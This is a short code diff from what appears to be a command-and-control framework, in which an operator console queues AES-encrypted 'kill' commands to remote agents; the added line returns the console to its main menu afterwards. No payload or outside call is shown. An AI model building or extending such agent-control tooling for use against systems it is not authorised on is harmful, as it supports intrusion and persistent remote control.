@@ -72,6 +72,7 @@ class cmd:
         else:
             #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"exit"))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"kill "+config.AGENTS[config.get_pointer()][8]))
+            config.set_pointer('main')
 
     def list(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
